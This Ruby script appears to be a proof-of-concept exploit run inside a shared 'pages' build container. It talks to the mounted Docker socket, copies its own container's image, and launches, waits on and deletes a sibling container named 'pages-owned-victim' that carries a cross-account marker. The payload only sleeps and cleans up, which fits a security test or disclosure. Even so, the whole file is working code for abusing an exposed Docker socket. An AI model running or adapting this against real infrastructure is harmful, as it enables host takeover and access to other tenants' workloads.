require 'json'
require 'securerandom'
require 'socket'

MARKER = 'PAGES_CROSS_ACCOUNT_MARKER_6f7d5214d9e84f87'

def docker_request(method, path, body = nil)
  payload = body.nil? ? '' : JSON.generate(body)
  socket = UNIXSocket.new('/var/run/docker.sock')
  request = "#{method} #{path} HTTP/1.0\r\nHost: docker\r\nConnection: close\r\n"
  unless payload.empty?
    request += "Content-Type: application/json\r\n"
    request += "Content-Length: #{payload.bytesize}\r\n"
  end
  socket.write(request + "\r\n" + payload)
  raw = socket.read
  socket.close
  status = raw.lines.first.to_s.split[1].to_i
  response_body = raw.split("\r\n\r\n", 2)[1].to_s
  parsed = JSON.parse(response_body) rescue nil
  [status, parsed]
rescue
  [0, nil]
end

current_status, current = docker_request('GET', "/containers/#{ENV['HOSTNAME']}/json")
image = current.is_a?(Hash) ? current['Image'].to_s : ''
name = "pages-owned-victim-#{SecureRandom.hex(6)}"
container_id = ''
create_status = 0
start_status = 0
wait_status = 0
delete_status = 0

unless image.empty?
  config = {
    'Image' => image,
    'Entrypoint' => ['ruby'],
    'Cmd' => ['-e', 'sleep 90'],
    'Env' => ["PAGES_CROSS_ACCOUNT_MARKER=#{MARKER}"],
    'NetworkDisabled' => true,
    'HostConfig' => {'AutoRemove' => false}
  }
  begin
    create_status, created = docker_request('POST', "/containers/create?name=#{name}", config)
    container_id = created.is_a?(Hash) ? created['Id'].to_s : ''
    unless container_id.empty?
      start_status, = docker_request('POST', "/containers/#{container_id}/start")
      wait_status, = docker_request('POST', "/containers/#{container_id}/wait")
    end
  ensure
    unless container_id.empty?
      delete_status, = docker_request('DELETE', "/containers/#{container_id}?force=1&v=1")
    end
  end
end

[
  'execution=true',
  "current_status=#{current_status}",
  "create_status=#{create_status}",
  "start_status=#{start_status}",
  "wait_status=#{wait_status}",
  "delete_status=#{delete_status}"
].join(' ')
